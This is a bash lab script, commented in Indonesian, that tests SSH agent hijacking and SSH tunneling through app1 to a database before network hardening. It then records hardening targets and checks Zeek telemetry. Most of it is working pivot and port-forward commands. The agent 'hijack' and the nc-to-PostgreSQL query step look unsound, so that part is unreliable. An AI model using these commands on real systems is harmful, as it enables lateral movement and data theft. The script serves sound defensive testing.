#!/usr/bin/env bash
# attack-tests/s03-s04-hijack-and-tunnel.sh
# Skenario Serangan S3 & S4: Pembajakan Agen SSH & Tunneling/Pivoting Lewat SSH
# Pemetaan: MITRE ATT&CK T1563.001 (SSH Hijacking) & T1572 (Protocol Tunneling) / T1090 (Proxy)
# Kondisi: Baseline Permisif (Pre-Hardening)
# Sumber: web1 (10.10.10.11) | Pivot: app1 (10.10.20.11) | Target: db1 (10.10.30.11)
set -euo pipefail

SSH_KEY="$HOME/.ssh/k8s-lab"
SSH_OPTS="-i $SSH_KEY -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=5"
OUTPUT_FILE="attack-tests/results-s03-s04-baseline.txt"
KEY_FILE="/tmp/compromised_id_ed25519"

echo "Skenario S3 & S4: SSH Agent Hijacking & Protocol Tunneling"
echo "Mode: BASELINE PERMISIF (Sebelum Pengerasan Microsegmentation)"
echo "Pemetaan MITRE: T1563.001 (Agent Hijacking) & T1572 (Tunneling)"

START_TS=$(date +%s.%N)

# --- UJI SKENARIO S3: PEMBAJAKAN AGENT FORWARDING ---
echo "--- 1. Mengeksekusi Skenario S3: Pembajakan Socket Agen SSH (T1563.001) ---"
S3_OUTPUT=$(ssh $SSH_OPTS dcadmin@10.10.10.11 'bash -s' << 'EOF'
set -euo pipefail
# Simulasikan socket agen admin yang tertinggal di web1 (SSH -A)
eval $(ssh-agent -s) >/dev/null
ssh-add /tmp/compromised_id_ed25519 2>/dev/null

# Hapus kunci sementara dari disk untuk membuktikan autentikasi murni dari socket RAM
rm -f /tmp/dummy_key_gone
cp /tmp/compromised_id_ed25519 /tmp/dummy_key_gone
ssh-add /tmp/dummy_key_gone 2>/dev/null
rm -f /tmp/dummy_key_gone

# Lakukan pivoting ke app1 menggunakan socket agen yang dibajak
hijack_res=$(ssh -n -o BatchMode=yes -o StrictHostKeyChecking=no dcadmin@10.10.20.11 'hostname && whoami')
eval $(ssh-agent -k) >/dev/null
echo "$hijack_res"
EOF
)
echo "  [OK] Hasil Autentikasi via Hijacked Agent Socket: $(echo "$S3_OUTPUT" | tr '\n' ' ')"

# --- UJI SKENARIO S4: PROTOCOL TUNNELING VIA SSH (-L) ---
echo
echo "--- 2. Mengeksekusi Skenario S4: Protocol Tunneling via SSH (T1572 / T1090) ---"
S4_OUTPUT=$(ssh $SSH_OPTS dcadmin@10.10.10.11 'bash -s' << 'EOF'
set -euo pipefail
# Bangun tunnel SSH lokal di web1 (port 15432) melintasi app1 menuju db1 (port 5432)
ssh -i /tmp/compromised_id_ed25519 -f -N -L 15432:10.10.30.11:5432 -o StrictHostKeyChecking=no dcadmin@10.10.20.11
sleep 1

# Eksekusi query database melintasi tunnel terenkripsi port 22
query_res=$(echo "SELECT * FROM core_accounts WHERE status='active';" | nc -w 2 127.0.0.1 15432)

# Tutup tunnel
pkill -f "15432:10.10.30.11:5432" || true
echo "$query_res"
EOF
)
echo "  [OK] Hasil Query Database yang Diekstrak Melalui SSH Tunnel:"
echo "$S4_OUTPUT" | sed 's/^/       /'

# Simpan artefak laporan baseline
mkdir -p attack-tests
cat > "$OUTPUT_FILE" << EOF
==========================================================
Hasil Pengujian Skenario S3 & S4 (Baseline Permisif)
Tanggal   : $(date '+%Y-%m-%d %H:%M:%S')
Kondisi   : Permisif (Pre-Hardening)
Sumber    : web1 (10.10.10.11)
==========================================================

1. HASIL SKENARIO S3 (SSH AGENT HIJACKING - T1563.001):
- Status        : BERHASIL (Eksploitasi Sukses)
- Bukti Autentikasi: $(echo "$S3_OUTPUT" | tr '\n' ' ')
- Analisis      : Penyerang di web1 yang mendeteksi socket SSH_AUTH_SOCK dapat
                  menggunakannya untuk melompat ke app1 tanpa memerlukan kunci
                  privat di disk.
- Target Hardening (Fase 7):
  * Terapkan 'AllowAgentForwarding no' pada sshd di seluruh server.
  * Terapkan isolasi segmentasi zona sehingga web1 tidak diizinkan membuka koneksi SSH lateral.

2. HASIL SKENARIO S4 (PROTOCOL TUNNELING - T1572 / PROXY - T1090):
- Status        : BERHASIL (Tunneling Sukses)
- Payload DB    : $S4_OUTPUT
- Analisis      : Penyerang di Web DMZ berhasil membuat port-forwarding tunnel lokal
                  (127.0.0.1:15432 -> app1 -> db1:5432), menyamarkan lalu lintas database
                  di dalam protokol SSH port 22 terenkripsi.
- Target Hardening (Fase 7):
  * Terapkan 'AllowTcpForwarding no' pada sshd node beban kerja.
  * Blokir koneksi SSH antar zona Web dan App secara default di OPNsense & nftables.
EOF

echo
echo "--- 3. Memverifikasi Deteksi Telemetri di SecOps (Loki & Zeek) ---"
sleep 3
ssh $SSH_OPTS dcadmin@192.168.122.81 python3 -s - "$START_TS" << 'EOF'
import sys
import urllib.request
import urllib.parse
import json

start_ts = float(sys.argv[1])

# Periksa rekaman sesi SSH di Zeek conn.log
query = '{job="zeek", log_type="conn"} |= "22"'
params = urllib.parse.urlencode({'query': query, 'limit': 15})
url = f"http://127.0.0.1:3100/loki/api/v1/query_range?{params}"

req = urllib.request.Request(url)
with urllib.request.urlopen(req) as resp:
    data = json.loads(resp.read().decode('utf-8'))

ssh_conns = []
for stream in data.get('data', {}).get('result', []):
    for v in stream.get('values', []):
        payload = v[1]
        if '10.10.10.11' in payload and '10.10.20.11' in payload:
            ssh_conns.append(payload)

if ssh_conns:
    print(f"  [OK] Zeek Telemetri: Menemukan {len(ssh_conns)} rekaman sesi SSH tunnel/lateral web1 -> app1:")
    for c in ssh_conns[:2]:
        print(f"       -> {c[:140]}...")
else:
    print("  [INFO] Menunggu agregasi sesi Zeek...")
EOF

echo
echo "Skenario S3 & S4 Selesai dieksekusi!"
echo "Hasil ringkasan tersimpan di: $OUTPUT_FILE"
